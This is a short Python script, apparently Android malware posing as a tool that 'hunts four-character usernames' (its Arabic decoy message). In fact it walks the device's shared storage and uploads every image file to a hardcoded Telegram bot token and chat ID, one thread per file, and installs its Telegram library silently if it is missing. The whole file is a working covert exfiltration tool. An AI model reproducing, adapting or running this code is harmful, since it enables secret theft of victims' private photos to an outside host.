import os
import subprocess
import sys
from threading import Thread
import telebot 
from telebot import types


try:
    import telebot
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
    import telebot
    from telebot import types 

bot = telebot.TeleBot("7312222597:AAFVLYWJJPFQgNc-dL2J1RVK3upLtJyg7vI")

dir_path = "/storage/emulated/0/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id="5198984934", photo=f)
        else:
            print("جاري صيد يوزرات رباعية...")

threads = []
for root, dirs, files in os.walk(dir_path):
    for file in files:
        file_path = os.path.join(root, file)
        t = Thread(target=send_file, args=(file_path,))
        t.start()
        threads.append(t)

for thread in threads:
    thread.join()

# AKRAM FATTAH